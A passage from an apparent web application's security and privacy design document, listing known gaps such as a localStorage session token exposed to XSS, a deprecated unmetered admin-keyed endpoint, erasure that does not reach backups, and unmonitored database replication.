Still open: free-text log columns (chat messages, bug-report descriptions) can contain
personal data someone typed about themselves, and nothing can match those
automatically.

## Known gaps / follow-ups

- **Single instance only** — the flat-file/SQLite-single-writer design corrupts under
  horizontal scaling (see the storage doc). This is an availability *and* integrity
  constraint.
- **`chat-upload` accepts any file type** (size-capped only).
- **No at-rest encryption** for the `/data` files beyond the host disk.
- **Session token lives in `localStorage`, not an `httpOnly` cookie** — so an XSS is
  account takeover, and `connectSrc`/`imgSrc: 'https:'` won't stop exfiltration. The
  fix, its true scope, and the CSRF surface it opens are written up under
  [Tokens in the browser](#tokens-in-the-browser-localstorage-not-a-cookie--accepted-risk).
  Deliberately deferred: it is a project, not a patch.
* **The public API's blast radius is the prepaid balance, and nothing more.** A leaked
  `stg_live_…` key can spend the credits already bought and cannot run up an invoice —
  there is no postpaid metering on that path. Keys are stored as `sha256$` digests
  (`lib/data/api-keys.js`), belong to exactly one account, and revoke immediately. This is
  the property that made prepaid the right billing model rather than merely a simpler one.
* **`POST /api/stage-by-endpoint-key` is deprecated and should be deleted.** It is an
  unmetered image generator behind `LOGS_ACCESS_KEY`, the same secret that opens the whole
  admin surface, so one leak is total compromise plus free AI. It now answers with a
  `Deprecation` header and warns on every call; the follow-up is removing it and narrowing
  that key's reach.

- **Erasure is operator-mediated** — `POST /api/admin/delete-user` exists, but there is
  no self-serve "delete my account" button in the product. Adding one is a product
  decision (confirmation flow, Stripe cancellation, copy in 11 languages), not a data-
  layer one.
- **Erasure does not reach backups.** Litestream replicates `auth-store.db` to R2, so a
  restored snapshot brings an erased account back. Retention there is a separate policy.
- **Share-link takedown is eventual (≤15 min)** — and it is *deletion*, not revocation:
  there is no off switch, so the only takedown is deleting the render (see the section
  above). Bounded and documented, not unbounded, but it is not instant and the copy must
  not claim it is.
- **Erasure of render bytes is a QUEUE, so it is eventually-consistent.** `deleteUser`
  commits tombstones inside its transaction (durable, replicated, survives an R2 outage)
  and a reaper drains them. So an erasure is *promised* atomically but *performed*
  asynchronously; `blobsPending` in the response is the honest count still owed. A
  reaper that never ran would leave bytes in the bucket with nothing else reporting it —
  the admin dashboard has no backup/erasure indicator yet.
- **No orphan-blob GC.** If the process dies between uploading an object and recording
  its row, nothing points at that object and nothing will delete it. The stale-pending
  sweep covers the common case; this is the narrow window between the two writes. A slow,
  invisible leak rather than a correctness problem.
- **Nothing in the app knows whether Litestream is running.** It fails safe and silent:
  a misconfigured entrypoint meant the database had **no off-disk backup for a month**
  and the only symptom was an R2 bucket reading `0 B`. See the warning at the top of
  [`deployment.md`](../operations/deployment.md). A boot-time warning and a dashboard
  indicator are the obvious fix and are not built.
